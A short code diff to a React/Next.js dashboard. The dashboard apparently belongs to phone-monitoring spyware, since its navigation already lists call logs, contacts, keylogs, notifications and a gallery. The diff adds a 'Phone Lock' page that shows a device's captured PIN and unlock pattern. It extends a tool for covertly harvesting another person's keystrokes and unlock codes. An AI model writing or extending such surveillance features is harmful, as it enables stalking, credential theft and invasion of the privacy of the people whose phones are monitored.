@@ -43,6 +43,7 @@ import {
     BatteryCharging,
     Signal,
     FolderOpen,
+    Lock,
 } from 'lucide-react';
 import Link from 'next/link';
 
@@ -66,6 +67,7 @@ const dataLinks = [
     { href: 'calls', label: 'Call Logs', icon: Phone, gradient: 'from-emerald-500 to-teal-400', description: 'Call history', key: 'calls' },
     { href: 'contacts', label: 'Contacts', icon: Users, gradient: 'from-purple-500 to-pink-400', description: 'Contact list', key: 'contacts' },
     { href: 'keylogs', label: 'Keylogs', icon: Keyboard, gradient: 'from-orange-500 to-amber-400', description: 'Keystrokes', key: 'keylogs' },
+    { href: 'phone-lock', label: 'Phone Lock', icon: Lock, gradient: 'from-red-600 to-rose-500', description: 'PIN & Pattern', key: 'unlocks' },
     { href: 'notifications', label: 'Notifications', icon: Bell, gradient: 'from-pink-500 to-rose-400', description: 'App alerts', key: 'notifications' },
     { href: 'settings', label: 'Settings', icon: Settings, gradient: 'from-slate-600 to-zinc-500', description: 'Device config', key: 'settings' },
     { href: 'gallery', label: 'Gallery', icon: Image, gradient: 'from-cyan-500 to-blue-400', description: 'Photos & media', key: 'gallery' },
